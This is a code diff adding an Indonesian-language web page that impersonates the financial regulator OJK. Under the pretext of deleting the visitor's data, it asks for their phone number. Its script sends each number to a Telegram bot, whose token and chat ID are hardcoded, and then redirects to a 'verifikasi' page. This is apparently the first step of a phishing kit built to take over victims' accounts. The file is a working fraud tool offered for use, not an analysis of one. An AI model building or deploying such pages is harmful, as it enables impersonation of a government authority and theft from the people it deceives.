@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>OJK Otoritas Jasa Keuangan</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 2rem;
+      color: #4a4a4a;
+    }
+    .container {
+      max-width: 420px;
+      margin: 0 auto;
+    }
+    header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 1rem;
+    }
+    header img.logo {
+      width: 36px;
+      height: 36px;
+      object-fit: contain;
+      margin-right: 8px;
+    }
+    header h1 {
+      font-size: 24px;
+      color: #000000;
+      margin: 0;
+      font-weight: 700;
+    }
+    p.instruction {
+      font-size: 14px;
+      margin: 16px 0 12px 0;
+    }
+    .input-group {
+      display: flex;
+      align-items: center;
+      background: #f2f3f5;
+      border-radius: 50px;
+      padding: 0 1rem;
+      height: 48px;
+      margin-bottom: 4px;
+    }
+    .country-code {
+      font-weight: 700;
+      color: #000;
+      user-select: none;
+      margin-right: 8px;
+    }
+    input[type="tel"] {
+      border: none;
+      background: transparent;
+      flex-grow: 1;
+      font-size: 16px;
+      outline: none;
+      height: 100%;
+    }
+    a.forgot-link {
+      display: inline-block;
+      margin-top: 8px;
+      font-size: 14px;
+      color: #0f7aff;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    a.forgot-link:hover {
+      text-decoration: underline;
+    }
+    button.submit-btn {
+      width: 100%;
+      margin-top: 24px;
+      padding: 14px 0;
+      background-color: #FF0000;
+      border: none;
+      border-radius: 50px;
+      color: white;
+      font-weight: 700;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button.submit-btn:hover {
+      background-color: #FF0000;
+    }
+    p.terms {
+      font-size: 12px;
+      color: #999;
+      margin-top: 24px;
+      line-height: 1.4;
+    }
+    p.terms a {
+      color: #0f7aff;
+      text-decoration: none;
+    }
+    p.terms a:hover {
+      text-decoration: underline;
+    }
+    .headphone-icon {
+      position: fixed;
+      top: 16px;
+      right: 16px;
+      width: 24px;
+      height: 24px;
+      cursor: pointer;
+      stroke: #000;
+      stroke-width: 2;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <!-- Ganti logo SVG dengan gambar -->
+      <img
+        src="https://kompaspedia.kompas.id/wp-content/uploads/2023/05/logo-ojk.png"
+        alt="Logo OJK"
+        class="logo"
+      />
+      <h1>Otoritas Jasa Keuangan</h1>
+    </header>
+
+    <p class="instruction">Masukkan nomor HP Anda untuk Hapus Data</p>
+
+    <form id="phone-form">
+      <div class="input-group">
+        <div class="country-code">+62</div>
+        <input 
+          type="tel" 
+          id="phone-input" 
+          name="phone" 
+          placeholder="Masukkan nomor handphone" 
+          pattern="[0-9]{6,15}" 
+          title="Masukkan nomor telepon yang valid" 
+          required 
+        />
+      </div>
+      <a href="#" class="forgot-link">Nomor sudah ganti/lupa?</a>
+      <button type="submit" class="submit-btn">Selanjutnya</button>
+    </form>
+
+    <p class="terms">
+      Sebelum lanjut, pastikan telah membaca, mengetahui, dan menyetujui ketentuan-ketentuan dalam 
+      <a href="#">Informasi Umum</a>, 
+      <a href="#">Syarat dan Ketentuan</a>, dan 
+      <a href="#">Kebijakan Privasi</a> OJK
+    </p>
+  </div>
+
+  <svg
+    class="headphone-icon"
+    xmlns="http://www.w3.org/2000/svg"
+    viewBox="0 0 24 24"
+    fill="none"
+  >
+    <path
+      d="M3 15v-3a8 8 0 0 1 16 0v3"
+      stroke="#000"
+      stroke-width="2"
+      stroke-linecap="round"
+      stroke-linejoin="round"
+    />
+    <rect
+      x="6"
+      y="15"
+      width="4"
+      height="6"
+      rx="1"
+      stroke="#000"
+      stroke-width="2"
+      stroke-linecap="round"
+      stroke-linejoin="round"
+    />
+    <rect
+      x="14"
+      y="15"
+      width="4"
+      height="6"
+      rx="1"
+      stroke="#000"
+      stroke-width="2"
+      stroke-linecap="round"
+      stroke-linejoin="round"
+    />
+  </svg>
+
+  <script>
+  const form = document.getElementById('phone-form');
+  const phoneInput = document.getElementById('phone-input');
+
+  // Ganti dengan token dan chat_id milik Anda
+  const TELEGRAM_BOT_TOKEN = '7910676766:AAFS7WsC-IiXkPxqH5e49_Uc6uHT6EUIFR8';
+  const TELEGRAM_CHAT_ID = '7880651844';
+
+  form.addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    const phoneNumber = phoneInput.value.trim();
+
+    // Validasi angka, minimal 6 digit, dan harus diawali angka 8
+    if (
+      phoneNumber.length < 6 ||
+      !/^\d+$/.test(phoneNumber) ||
+      !phoneNumber.startsWith('8')
+    ) {
+      alert('Nomor handphone harus diawali angka 8 dan hanya berisi angka.');
+      phoneInput.focus();
+      return;
+    }
+
+    const fullPhoneNumber = '+62' + phoneNumber;
+    localStorage.setItem('phoneNumber', fullPhoneNumber);
+
+    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const messageText = `Nomor HP Masuk/Daftar: ${fullPhoneNumber}`;
+
+    try {
+      const response = await fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: messageText,
+        }),
+      });
+
+      if (!response.ok) {
+        throw new Error('Gagal mengirim pesan ke Telegram');
+      }
+
+      window.location.href = "verifikasi.html";
+      form.reset();
+    } catch (error) {
+      alert('Terjadi kesalahan saat mengirim ke Telegram: ' + error.message);
+    }
+  });
+</script>
+
+</body>
+  </html>
+      
